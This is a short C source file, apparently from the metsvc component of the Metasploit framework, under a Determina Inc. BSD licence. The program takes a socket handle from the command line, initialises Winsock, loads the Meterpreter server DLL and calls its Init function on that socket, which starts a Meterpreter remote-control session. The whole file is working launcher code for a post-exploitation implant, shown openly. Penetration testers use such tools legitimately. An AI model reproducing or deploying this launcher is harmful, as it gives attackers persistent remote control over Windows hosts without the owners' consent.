/* Copyright (c) 2007, Determina Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of Determina Inc. nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>

#include "metsvc.h"

typedef DWORD (*init_fn)(SOCKET fd);

int main(int argc, char **argv)
{
	HMODULE lib;
    init_fn init;
    WSADATA wsa_data;
	SOCKET sock = INVALID_SOCKET;

    // The socket is passed as the first argument on the command line

    if (argc != 2)
        goto cleanup;

    sock = atoi(argv[1]);

    // Initialize Winsock 
            
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        goto cleanup;

    // Load the Meterpreter DLL and get the address of the Init function

    if ((lib = LoadLibrary(METSRV_DLL)) == NULL)
        goto cleanup;

    if ((init = (init_fn)GetProcAddress(lib, "Init")) == NULL)
        goto cleanup;

    // Start the Meterpreter

    __try {
        init(sock);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        closesocket(sock);
        return 0;
    }

cleanup:
    if (sock != INVALID_SOCKET)
        closesocket(sock);

	return 0;
}
